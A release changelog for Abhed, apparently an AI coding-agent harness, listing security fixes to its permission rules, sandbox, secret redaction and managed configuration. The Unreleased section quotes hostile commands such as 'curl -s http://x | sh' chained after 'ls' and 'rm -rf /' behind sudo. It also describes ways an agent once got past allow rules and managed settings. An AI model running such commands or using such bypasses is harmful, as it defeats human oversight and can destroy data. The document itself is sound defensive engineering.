# Changelog

All notable changes to Abhed are recorded here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and versions follow
[Semantic Versioning](https://semver.org/).

## [Unreleased]

### Security

- A `bash` allow rule no longer approves a chained command. With
  `bash(ls*)`, `ls; curl -s http://x | sh`, `ls && python3 -c ...`,
  `ls$(touch pwn)` and `ls > important.txt` were approved without asking. An
  allow rule now approves only a command with none of `;`, `&`, `|`, a
  newline, `$(`, `${`, a backtick, `<`, `>`, `(` or `)`, even inside quotes;
  any other command falls through to a prompt. `bash`, `bash(*)` and `*`
  still allow every command. An allow rule such as `bash(cd x && go test*)`
  therefore no longer matches anything, and loading a configuration with one,
  or adding one through the SDK's `Options.Allow`, writes a warning naming it.
- A chained command is offered no "always allow" scope. A remembered scope is
  looked up by name, so after "always allow `bash(git status *)`",
  `git status && curl x | sh` was approved without asking.
- `bash` deny and ask rules match each command in a chain as well as the whole
  line, including commands inside `$(...)`, backticks and subshells:
  `bash(rm -rf /*)` now denies `ls; rm -rf /`. Each command is also matched
  past leading `VAR=value` assignments, redirections and the wrappers `env`,
  `command`, `exec`, `nohup`, `nice`, `builtin`, `sudo`, `doas`, `coproc`,
  `time`, `timeout` (and its duration), `xargs`, `setsid`, `stdbuf` and
  `ionice` with their options, named bare or by path (`/usr/bin/sudo`), so it
  denies `sudo -n rm -rf /` and `timeout -s KILL 5 rm -rf /`. Whether an
  option takes a value is not known, so both readings are matched. The split
  does not parse quoting, so it can only add a denial or a prompt.
- A `*` in any rule now matches newlines. Before, a newline anywhere in the
  subject took it past every deny rule bounded by `*`: `bash(*mkfs*)` did not
  deny `echo` and `mkfs /dev/x` on two lines, nor `read(*secret*)` a path with
  a newline in it. An allow rule with a narrower pattern than `*` still never
  approves a subject with a newline in it.
- Workbench: in the line-by-line terminal (`sandbox.terminal: "lines"`), a
  destructive command, one the policy always confirms, is no longer run on
  Enter. The terminal shows the reason and asks `Run it? [y/N]`; only `y` runs
  it, recorded as `action.approved` with `"confirmed": "true"`, and anything
  else is recorded as the person's declined `action.denied` and drops the
  lines queued behind it. `POST
  /v1/sessions/{id}/pty` answers such a line with `confirm` and runs nothing
  until it is sent again with `"confirmed": true` (or `"declined": true`), so
  a client that sends neither never runs it; `"declined": true` for a line
  that needed no confirmation runs and records nothing. Other lines, the
  Explorer and the interactive terminal are unchanged.

## [1.1.2] - 2026-09-25

### Changed

- The terminal carries the new mark: the startup banner draws the Abhed A,
  and the accent the CLI uses for the prompt, tool calls, headings and inline
  code is the brand orange instead of cyan.
- The HawkEYE report uses the console's ink, paper and orange palette in both
  themes.
- The page shown when sign-in is not configured carries the Abhed lockup.
- On a phone, the console and workbench headers show the mark alone, and
  neither page scrolls sideways: the console drops its "console" label and
  Password link, and the workbench drops its Password, Switch and classic
  console links. On both, the signed-in name links to the account page.

### Fixed

- The documentation embedded in the binary linked web fonts, so a connected
  machine made a request to another host when the docs were opened. It now
  uses the system fonts and loads nothing from outside, whichever way the
  binary was built; a test holds it there.

## [1.1.1] - 2026-09-25

### Changed

- The web console, the sign-in page, the workbench, the account page and the
  embedded documentation carry the new Abhed and Zybuu marks and an ink, paper
  and orange palette, with a dark theme designed alongside the light one. On
  the console, sign-in, workbench and account pages the images are embedded in
  the binary as data URIs, so those pages still load nothing from anywhere; no
  route was added.
- The sign-in page shows the mark in place of the animated network, and it
  keeps still under reduced motion.
- `/favicon.ico` is now a PNG; `/favicon.svg` remains an SVG.
- The lockups and marks in `brand/` are PNG files; the SVGs were removed.

## [1.1.0] - 2026-09-24

### Added

- `hawkeye.AnalyzeWith` and `hawkeye.Options`, for what the caller knows
  beyond the record (`Live`: the session is still running there), and
  `hawkeye.Call.Actor` (`actor` in the JSON report): whether the model or a
  person made the call. `Analyze` is unchanged.
- `config.Config.ManagedKeys`, the settings the managed file set as dotted
  paths, and `Config.ManagedSets` to ask about one; `config.Overrides`,
  `Config.Apply`, which lays a caller's overrides over a configuration so
  they may tighten the managed settings and never loosen them, and
  `config.ManagedError`, the refusal it returns; `config.LoadManaged`, the
  defaults with only the managed file applied.
- A configuration key that nothing reads is reported: it is still ignored, so
  every configuration that loaded before still loads, but each one is written
  to standard error once, with its file, its JSON path and, when a known key
  is close, the one probably meant (`model.provider` → `model.default`).
  `abhed doctor` lists them and fails. Keys starting with `_` or `$`
  (`_comment`, `$schema`) are annotations and never reported; one in the
  managed file says so. `config.Config.Unknown` carries them, and
  `config.UnknownKey.Managed` marks one found in the managed file.
- `GET /account`, where a local-accounts user changes their own password, and
  `switch_url` and `password_url` in `/v1/whoami`, naming the routes this
  deployment has for switching user and changing a password.
- Workbench: a **Search** view across the workspace, with match case, whole
  word and RE2 regular expressions, results grouped by file and opened at the
  line (`GET /v1/sessions/{id}/search`). It reads only what the Explorer shows
  and passes over the folders `grep` does; it stops at 2,000 results, 20,000
  files or five seconds and says which, marks a file cut at 100 matches, and
  runs at most two at once per session.
- Workbench: the Explorer makes new files and folders, renames (F2) and
  deletes, from its toolbar and a right-click menu (`POST
  /v1/sessions/{id}/folder`, `/rename`, `/delete`). Each is recorded as the
  person's own command and held to the bash rules and the sandbox. Every
  path it touches, as named and with links followed, and everything inside a
  folder at its old and new path, must be one the workbench would open and a
  save to which the write rules allow.
- Workbench: save all (⌥⌘S / Ctrl Alt S), close the editor tab (⌘W / Ctrl W
  where the browser passes it on), Ctrl \` for the terminal, ⇧⌘F for search,
  the file's path and the cursor above the editor, a prompt before leaving
  with unsaved edits, and open tabs restored after a reload.
- `web/ide/editor.js` has a documented, empty seam where a language server
  will attach; nothing is registered yet.
- `edit` and `write` parse Go, JSON and Python before writing, where a parser
  is available (see the tools guide for Python's conditions). A change that
  would leave a file that parsed no longer parsing is not applied, and the
  model is told the error and the line; an `edit` whose new text is a pasted
  diff is refused the same way. Workbench saves are warned, never refused.
  HawkEYE reports a refused change as `broken-edit`. `tools.syntax_check`:
  `refuse` (default), `report` or `off`. It comes from sessions in which a
  model wrote diff markers into Python files.
- The `monitor` package and a policy step for it: a judge that reads the
  remit, the agent's reasoning and where a call's arguments came from, and
  may only tighten a decision; unavailable means ask, or deny when headless.
  Verdicts are recorded as `monitor.verdict`. The local-model judge follows.
- Workbench chat: a message shows as soon as it is sent, with a *Thinking…*
  line and seconds count until the reply starts; reasoning streams into a
  live block; replies render as markdown built from text, never markup. A
  message sent while the agent works is queued for the next step with **Send
  now** and **Cancel**, and marked delivered when the agent reads it. Esc
  stops a run only when pressed twice.
- `GET /v1/sessions/{id}/queue` and `DELETE /v1/sessions/{id}/queue/{qid}`
  list and withdraw queued messages. A follow-up to a busy session answers
  with a `queue_id`, and the `user.message` that delivers it carries the same
  id; `"interrupt": true` stops the running turn and sends the message fresh.
  A `client_id` on any post is echoed on its `user.message`. The queue routes
  and `/interrupt` answer `421` with `Abhed-Session-Node` for a session
  running on another node, as `/approve` does.
- `agent.reasoning.delta` events carry reasoning as it streams.
  `agent.reasoning` is unchanged and still follows with the whole text.
- The event stream takes `?after=<seq>` as well as `Last-Event-ID`.
- Hooks for the paid editions, all nil or unset by default so the Community
  Edition behaves as before: `auth.LocalAuth.Admit`, asked after a password
  checks out and before a session is issued; `auth.Middleware.Check`, run
  after any provider, token or proxy identifies someone, which ends a refused
  session and answers 403 with the reason (a browser goes to `/?refused=`),
  and which `/v1/whoami` and `/v1/overview` honour too; and
  `server.Options.AdminAudit`, told of every `/v1/admin/*` change. An MCP
  server's URL is recorded without credentials or query, and its command as
  the program alone.
- `auth.LocalAuth.Sessions` lists live local sessions by a digest of their
  cookie, never the cookie, with when each was created, last seen and
  expires; `EndSession` ends one by that digest. `auth.SessionEnder` lets a
  provider end a request's session without answering it.
- In `proxy` mode `/v1/whoami` reports the identity the proxy supplied, and
  the console and workbench show it. Sign-out appears only when the new
  `auth.proxy_logout_url` names the proxy's own.
- `auth.github.orgs`, `auth.github.teams` and `auth.github.allow_any`, for the
  paid editions' GitHub sign-in. Validated in every edition; the Community
  Edition does not otherwise read them.
- The workbench terminal is a shell: each tab is one interactive `bash` in the
  session's sandbox, at the workspace root, with history, completion, state
  between lines and full-screen programs. Tabs can be added, renamed and
  closed; resize, multi-line paste, Ctrl+C and a Kill button work; a banner
  states the sandbox tier, the workspace and the network, and the `none` tier
  is flagged in red. Opening the shell is a judged, recorded `bash` call;
  each line is screened against the deny rules as typed and recorded as the
  new `terminal.input` event. The docs say plainly that the sandbox is the
  boundary and the line checks are best effort. `sandbox.terminal: "lines"`
  keeps the one-checked-command-per-line terminal, which a managed policy
  also gets when it has deny rules for `bash` or for every tool (`*`), or a
  policy hook such as an extension. A page reload reattaches to its shells; a
  shell nobody watches ends after 30 minutes (`sandbox.terminal_idle_minutes`).
  When a shell ends, everything still running in its process session is
  stopped and killed, pass after pass, including jobs started with `nohup`,
  `disown` or `trap '' HUP`; a process that starts a session of its own
  escapes and runs, within the sandbox, until it ends. If the sweep cannot
  run, the server logs a warning (`the shell's session was not swept`) with
  the session, the terminal and the reason. On the `none` and `process` tiers
  a shell runs as the server's user and shares its process limit, so a fork
  bomb there can exhaust it for the server too.
- A session can be opened without a prompt (`POST /v1/sessions` with
  `"workbench": true`). The workbench opens one, so the terminal works as soon
  as the page loads; the first message goes to it. It records
  `session.started`, is owned and listed like any other, and session lists
  now carry each session's `mode`.

### Changed

- **Upgrade note:** `abhed doctor` now exits non-zero when the configuration
  has a key that nothing reads, in any file, the managed one included. A
  pipeline that ran `abhed doctor` cleanly on 1.0.1 may fail on 1.1.0
  until the key is corrected or removed; the warning names the file and the
  key.
- **Upgrade note:** a managed file (`/etc/abhed/config.json`) behind a
  directory that cannot be searched, or a link there to nothing, now stops
  `abhed` instead of being ignored. The SDK now reads the managed file even
  without `ConfigDir`, so an embedder on a host with one is bound by it.
- An unknown permission mode given to `-mode` or the SDK's
  `Options.Mode` is refused; it ran as `default`.
- The SDK applies the configuration's `permissions.ask` rules, as the CLI and
  server do; it ignored them. This only adds prompts.
- The reason given when a call is put to a person is accurate for the tool:
  "running a command needs approval in default mode" for `bash`, "changing a
  file needs approval …" for `edit` and `write`, where every such call read
  "mutating tool requires approval". What is allowed, asked and denied is
  unchanged; only the `reason` text differs.
- **Security-relevant default:** the workbench terminal no longer judges each
  line before it runs. After an upgrade it is an interactive shell, bounded by
  the sandbox, in which `bash` deny rules only screen each line as typed and
  miss what the shell expands, recalls or runs from a script. To keep a policy
  decision on every line, set `sandbox.terminal: "lines"`; a managed policy
  keeps it without that setting when it has deny rules for `bash` or for
  every tool (`*`), or a policy hook such as an extension. Deny rules still
  hold for every tool call, the agent's and a person's.
- The workbench streams replies with one DOM append per frame, follows the
  conversation only when you are at the bottom of it, reconnects from the last
  event it drew rather than replaying the session, draws a tool call's body
  when it is opened, and keeps the Events panel to its latest 500 rows.
- A message queued while the final turn of a run was answering is now
  answered in the same run; before, it waited for the next prompt. One left
  queued by a run that was stopped is delivered ahead of the next prompt.
- The event stream reads events back from the record when the store dropped
  them for a subscriber that fell behind, so none is lost or repeated.
- A `model.call` cut short by an interrupt no longer records the cancelled
  stream as an error; the session ends as `user_interrupt` as before.
- `/v1/whoami` names `sign_out_url` when there is one, and the console and
  workbench draw Sign out only then.
- The workbench editor is now Monaco (MIT), in place of CodeMirror: its
  default keybindings, multiple cursors, minimap, find and replace, folding,
  bracket matching, go to line and go to symbol, and in-browser language
  services for JSON, CSS, HTML, JavaScript and TypeScript. Review uses its
  diff editor, side by side or inline, with Accept and Reject on each change.
  The components under `/ide/vendor/` are now kept and sent gzipped, about
  3.5 MB (14 MB unpacked, for a client without gzip), half of it the
  TypeScript worker, which loads only for JavaScript and TypeScript; the
  binary grows by about 2.4 MB. The workbench's content security policy adds `font-src 'self'` for the editor's
  icon font; its workers are same-origin files, so no `blob:`, `worker-src` or
  `unsafe-eval` is needed, and each is served with its own
  `default-src 'none'; script-src 'self'`.
- The workbench's terminal and editor reopen a session from its record after
  a restart, where they answered 409; if it cannot be reopened, the page opens
  a fresh workbench session. A clean shutdown records `session.ended` for
  workbench sessions nobody has messaged, so they can be reopened.
- A session continued from its record no longer shows the model the calls a
  person made in the workbench, which the model had never seen while the
  session ran, and `recall` no longer returns their results.
- `GET /v1/capabilities` reports the sandbox tier in force and its mechanism,
  not the configured minimum.
- `SECURITY.md` supports the latest 1.x release; earlier 1.x releases are
  asked to upgrade, and 0.x is no longer supported.
- `abhed-bench`: `cache_reported` in the JSON output now means the endpoint
  sent a cached-token figure, zero included, rather than that some prefix was
  cached. A stack that reports zero on every turn gets the no-caching warning,
  worded as such.
- Sessions from the command line, the server and the Go SDK now refuse an edit
  or write that would break a file's syntax, where they applied it before.
  Set `tools.syntax_check` to `report` or `off` to keep the old behaviour;
  the SDK also takes `Options.SyntaxCheck`.

### Deprecated

- `auth.LocalAuth.Whoami`: nothing registers it; the server answers
  `/v1/whoami` for every provider. It goes in 2.0.

### Removed

- The benchmark (`bench/`, `docs/benchmarks`) is no longer part of this
  repository. The three multi-harness rig runs published so far are
  withdrawn: the rig did not give every harness the same conditions. The
  earlier single-file comparison of 2026-09-14 is no longer published either.
  Both remain in this repository's history. A result published later will
  come with its method and raw records, whatever it shows.

### Fixed

- The classic console's **Workbench** link sat with the signed-in user's
  controls, which the console removes on a server without sign-in, so there
  was no way back to the workbench there. It now sits beside the brand, at
  every width.
- `abhed -h`, and an unknown flag, print a synopsis, every subcommand with
  what it does, an edition's own commands, and then the flags; they printed
  the flags alone. `-addr` read as `-addr abhed serve` and now reads as a flag
  with a value. `app.WithCommand` now also ignores `hawkeye`, `migrate`,
  `resolve`, `acp` and `secret`, which Main always dispatched itself.
- On the macOS process tier with the network off, a command could list the
  host's interfaces, LAN address, gateway and VPN tunnels (`ifconfig`,
  `netstat -rn`, `route -n get`, `scutil --nwi`). The sandbox now denies the
  routing sysctls, routing sockets, and the system configuration and network
  services too, as Linux's network namespace does.
  MAC addresses from the I/O registry and the host name stay visible; the
  security posture says so.
- On the macOS process tier, `pytest` and `ls -R` in the workspace failed
  with "Operation not permitted" on `.abhed`. A command may now stat it and
  what it holds, so they pass it by, as `git add -A` does; it still cannot
  list it or read or write its files. `find .` and `du` still report it and
  exit 1.
- A workbench shell ended by the person, by `exit`, Kill, closing its tab,
  closing the session or going unwatched, is recorded with its exit status and
  not as an error, and the record says how it was closed. Only a shell that
  failed to start is an error. A command ended by a signal, the agent's
  `bash` call or one in the workbench terminal, now records 128 plus the
  signal's number as its `exit_code`, as a shell reports it, where it
  recorded -1.
- HawkEYE no longer attributes a person's workbench calls to the model: calls
  with `actor: user` never raise `repeated-failure`, `slow-tool`, `truncated`
  or `borrowed-host`. `no-end` is not raised for a session still running on
  the server; offline, with a shell still open, it says so.
- The workbench chat shows the conversation with the agent. The person's own
  calls (shells, terminal lines, Explorer operations and saves) no longer
  appear in it; they stay in Events and the record, and saves in Changes.
- An administrator whose account has an email address could remove their own
  administrator rights: the guard compared the username with the email. It now
  compares the account itself, and the last administrator cannot be removed by
  anyone.
- A password set by an administrator now has to be changed before anything
  else: until it is, the session reaches only `/account`, `POST /v1/password`,
  `/v1/whoami`, sign-out and static files. A browser is sent to `/account`; an
  API call gets `403 {"error":"password change required"}`. It had been a note
  in the workbench.
- In `proxy` mode, a request whose proxy names no user no longer carries the
  groups in `X-Abhed-Groups`.
- The workbench is where sign-in lands, and the console links to it; it had
  to be reached by typing `/ide`. Switch no longer leads to a 404 on local
  accounts, Admin appears only where an admin page exists, and a local user
  can change their own password at `/account`, which also ends a password an
  administrator set. The workbench shows who is signed in, pages have an
  icon, and the editor files are revalidated so an upgrade never serves a
  stale copy. The authentication guide says which edition has which sign-in,
  and no longer promises API tokens the Community Edition does not issue.
- On the container tier, a workbench terminal command ran the engine's CLI
  with only `TERM` in its environment, so it had no `PATH`, `HOME` or
  `DOCKER_HOST`. It now inherits the host's environment; only the `-e` flags
  reach the container.
- The Explorer no longer collapses every folder when a command finishes; it
  reloads in place and keeps the folders that were open.
- Interrupting or deleting a session that had been continued from its record,
  and was idle, no longer fails on a missing cancel function.
- HawkEYE's `cold-cache` finding no longer fires when the provider reports no
  cached-token figure at all, as some OpenAI-compatible endpoints do; absence
  had been read as zero. `model.call` events record `cache_reported`; a
  record written before this has none, so `cold-cache` is not raised on it.
  (#74)
- A turn that spends its whole output budget reasoning without a tool call
  is a stall, not an answer: the model is told its reply was cut off, the
  next call asks for low reasoning effort, the turn is marked `cut_off` in
  the record and HawkEYE reports `output-cap`. Sessions ended this way; some
  read as completed because a sentence had come out before the cut.

### Security

- **A secret split across streamed fragments reached the record.** The reply
  is recorded as many `agent.delta` events, and redaction ran on each one, so
  a stored value that arrived in two fragments matched in neither: it
  reached the record and the live stream in pieces. `agent.message` was
  always redacted whole. `agent.reasoning.delta` is redacted the same way. The model holds a value only when a prompt or an
  @-mentioned file carried one, since tool output is redacted before it sees
  it. Streamed text is now held back by about the length of the longest
  stored value, redacted with what follows, and released at the end of the
  turn, on error or on interrupt; with no secrets stored nothing is held
  back. `server.Options.Redact` now takes any type with methods
  `Redact([]byte) []byte` and `Span() int`, the length of the longest text
  it replaces; a nil pointer of such a type means no redaction.
- **A value next to a JSON escape could be left in place.** Values were
  matched against the escaped payload, so one whose bytes also occurred
  across an escape (`\u003e`, `\n`) could break the JSON, and tool output
  was then passed on unredacted. Values are now matched in the decoded text
  of each string, and redaction fails closed: text that cannot be redacted
  becomes `[redacted: output withheld]`, and a payload left invalid is
  replaced whole.
- **An embedded agent could loosen the managed configuration.** The SDK let
  `Options.Mode` replace the managed permission mode, including with
  `bypass`, which the CLI and server refuse under a managed file; it never
  marked its policy engine managed, so the workbench terminal's managed
  line-by-line enforcement and the engine's own `bypass` refusal did not
  apply; without `ConfigDir` it did not read the managed file at all; and
  `Options.SyntaxCheck` could turn a managed syntax check off. The CLI's
  `-mode` flag also replaced a managed mode. Now `config.Load` records which
  keys the managed file set, and the CLI's flags and the SDK's `Options` may
  tighten those settings and never loosen them: `bypass` is refused under a
  managed file; a managed `permissions.mode` admits only itself or `plan`;
  a managed `tools.syntax_check` only something stricter; a managed
  `limits.max_turns` only a lower limit; a managed `permissions.allow` or
  `additional_dirs` no additions. Deny rules from a caller are added to the
  managed ones. A refused override is an error from `abhed` and from
  `sdk.New`, never a silent change. The SDK reads the managed file with or
  without `ConfigDir`, marks its engine managed, and wraps bash in the
  configured sandbox when the managed file sets a `sandbox` key (and fails
  when no backend meets its `min_tier`). The interactive `/mode` command is
  bound as `-mode` is. `abhed eval`, which approves every prompt with nobody
  to ask, refuses to run under a managed file. `abhed resolve` runs in a
  pinned managed mode unless `-mode` says otherwise. A refusal names the
  managed file. A managed file behind a directory that cannot be searched,
  or a link at the managed path to nothing, is an error; both were treated
  as absent, as the SDK treated the file when `ConfigDir` was empty. Keys in
  the managed file
  are matched as the JSON decoder matches them, so one it applies, such as
  a key spelt with `ſ`, is also bound and is not reported as unknown.
  Without a managed file, the only changes are the two under Changed: an
  unknown mode is refused, and the SDK applies `permissions.ask`.

## [1.0.1] - 2026-09-22

### Added

- `auth.users_file` (`ABHED_USERS_FILE`): where local accounts are kept when
  there is no database. A deployment points it outside every workspace.
- `app.WithMigrateExtension`: an edition with tables of its own registers
  their schema and the runtime role's privileges, so one `abhed migrate`
  provisions the whole record under the owner and runtime roles.

## [1.0.0] - 2026-09-22

The first major release. From here the command line, the configuration
schema, the event record and the Go SDK (`sdk`) follow semantic versioning:
a change that would break any of them is a 2.0. The other public Go packages
(`server`, `auth`, `store`, `config`, `app`) are supported extension points
whose shape may still move in a minor release, and say so when it does.

### Added

- **The workbench at `/ide`.** An editor with syntax highlighting beside the
  agent, a file tree, a changes view that opens each file for review with
  accept and reject chunk by chunk, a terminal, and HawkEYE live. Edits and
  terminal commands made by the person go through the same policy, sandbox
  and record as the agent's, marked as theirs. `@path` attaches a file to a
  message; select code and press the focus-agent key to ask about it. The
  editor and terminal components are built into the binary, so nothing loads
  from the network.
- **HawkEYE.** `abhed hawkeye`, `/hawkeye` and `GET /v1/sessions/{id}/hawkeye`
  report what a session did from its record alone: per-turn tokens and
  context, the policy step behind every call, files touched, subagents,
  compactions, and deterministic findings — a call to a host that only tool
  output supplied, a credential path, a gap in the record, a redacted secret.
- **Context that keeps its record.** Old and large tool results leave the
  window for a one-line pointer once it passes `context.offload_at`; the full
  text stays in the record and the new `recall` tool reads it back by id,
  text or offset. Nothing is lost from the record; anything dropped from the
  window can be retrieved.
- **Secrets by name.** `abhed secret set NAME` stores a credential outside
  every workspace. The model sees the name, asks for it on one command, and
  gets it only under a `secret(NAME)` allow rule, in every mode. Every event
  is redacted before it is written and every tool result before the model
  reads it; HawkEYE reports a redaction.
- **`abhed resolve <issue-url>`** turns an issue on GitHub, GitLab or
  Gitea/Forgejo — self-hosted instances and their certificate authorities
  included — into a branch in its own worktree, a commit, a push and a pull
  request. Opening the request is its own policy-judged action, `forge_pr`.
- **`abhed acp`** speaks the Agent Client Protocol over stdio, so Zed,
  JetBrains and other editors run Abhed as their agent; their approval dialog
  answers asks and cannot lift a deny.
- **The benchmark rig** (`bench/rig`): several harnesses on one local model
  over multi-file tasks with a validity gate, self-tests, two context
  conditions and paired bootstrap intervals. Results are published whatever
  they say; the first published run is still owed.
- **Scale.** A session's node is recorded and requests routed to it,
  approvals are answered on any node, a node's claim is refreshed while its
  turn runs, and shutdown drains instead of ending turns in flight.
- **`abhed migrate`** and two database roles: an owner that migrates and a
  runtime role that can only append.

### Changed

- The permission mode no longer decides secrets, and a write or edit that
  could not succeed is refused before anyone is asked to approve it.
- A finished terminal command stays readable for a minute, so a short one is
  not lost to a reader that connects late.
- The gosec baseline update refuses a change that would silently drop triaged
  findings.

### Fixed

- Long files in Hindi, Japanese, Russian and other non-Latin scripts were
  refused as binary two times in three.
- A prompt label cut mid-character produced invalid UTF-8 that the database
  refused. Contributed in #38.
- bubblewrap hid a workspace under `/tmp` behind its own tmpfs, so every
  command there failed to start.
- The docs site fails the build when two pages claim one URL instead of
  writing one over the other.

### Security

- **The agent cannot reach its own configuration in any mode.** The file
  tools refuse any path with a `.abhed` component, and the process sandbox
  denies commands reading or writing it, in the workspace and in the home
  directory; `~/.abhed/skills` stays readable. Before this, `auto` and
  `bypass` mode let the write tool rewrite `config.json` or plant
  `users.json`.
- **`/download` withheld nothing.** Any signed-in user could download the
  server's own state (`users.json`, `config.json`) and files a deny rule
  covers. Both are refused now, as the viewer and the agent refuse them.
  Deployments on 0.2.0 should upgrade and treat local account passwords as
  exposed.
- **The audit record is protected from the server's own credentials.** The
  application role owned the tables, so it could truncate them or disable
  the append-only triggers. The runtime role now holds insert and select
  only, a `BEFORE TRUNCATE` trigger stands as well, and the server refuses to
  start as a role that could alter the record. Configure `storage.migrate_dsn`
  for the owner, or `storage.single_role` to keep one role knowingly.
- The egress, credential and configuration boundaries are verified on Linux
  under bubblewrap in a privileged CI job, not only on macOS.

## [0.2.0] - 2026-09-19

### Security

- Uploads no longer land in `.abhed/`, the directory the agent is denied. A
  deployment carrying the ordinary `read(**/.abhed/**)` rule refused every file
  a user attached, and the model reported it as a policy denial for a document
  it had just been handed. Attachments now go to `<workspace>/uploads/`.
- The upload endpoint requires session ownership. Any authenticated caller
  could previously write a file into another user's session directory, which
  the victim's agent then read as untrusted input.
- Policy rules can scope tools whose argument is not `command` or `path`.
  `deny k8s_get(secrets*)` compiled and never fired, and because `k8s_get` is
  read-only the read was auto-approved in auto mode.
- Pipeline tool arguments escape substitutions, so untrusted prior-step or RAG
  output cannot close a JSON string and change the arguments a tool receives.
- The legacy MCP SSE transport pins its POST endpoint to the configured
  origin, so a hostile server cannot redirect client posts — and the auth
  headers they carry — to an arbitrary URL.
- Extension `environ` layers on the inherited environment instead of replacing
  it, so setting one variable no longer drops `HOME`, `PATH` and the locale.

### Added

- `max_budget_tokens` is enforced on the primary agent, not only at
  subagent-spawn time. A session that exhausts its allowance ends with the
  terminal reason `max_budget`.
- Sessions record how full the context was, not only what they cost.
  `context_tokens` and `context_window` sit alongside the cumulative token
  totals in the session record and the `session.ended` event.
- The CLI shows a thinking indicator while the model works, completes slash
  commands as they are typed, and displays the model's reasoning, collapsed by
  default and expanded with `/think`.

### Fixed

- A session ended by server shutdown records the terminal reason `shutdown`
  rather than `user_interrupt`, so the audit log can tell a user stopping a run
  from the process going away.
- Every terminal reason is now either emitted in live code or marked reserved.
  Nine were defined, six reachable, and the README claimed eight.
- `exit` and `quit` end an interactive CLI session. Without a leading slash
  they were sent to the model as a prompt.

### Changed

- CI gates on CVEs, coverage and the adversarial suite. Scans cover the built
  binary and the container image, not only the source, and a scan that does
  not run fails the build rather than reading as clean. Coverage may not drop
  below the recorded floor.

### Documentation

- The `vm` sandbox tier is documented as gVisor, which is what ships, rather
  than a Firecracker or Kata microVM, which does not.
- The security document states that the opt-in network tools execute outside
  the sandbox boundary, and which of them auto mode approves without a prompt.
- Benchmark results separate token count from cost, with the input and output
  split, because tokens are only cost on a hosted per-token API.

## [0.1.0] - 2026-09-15

The first public release of the Community Edition.

### Added
- The agent loop with tool contracts, a tiered execution sandbox, and a
  permission engine whose deny rules hold in every mode.
- Twenty model providers over three wire formats, chosen per session.
- Five ways to run it: interactive, headless (`-p`), JSON events per line,
  JSONL RPC over stdio, and a single-tenant server with a web console.
- A Go SDK that gives your own program the same loop with the same policy
  and audit guarantees, including validated structured output.
- An append-only audit record with replay, fork from any step, and export,
  in memory or in Postgres with row-level security.
- Skills, extensions (JSONL over stdio, veto-only), MCP servers, and
  parallel subagents in git worktrees.
- `abhed doctor`, which proves the endpoint answers, tool calling works,
  and a command runs under the sandbox before you trust a run.
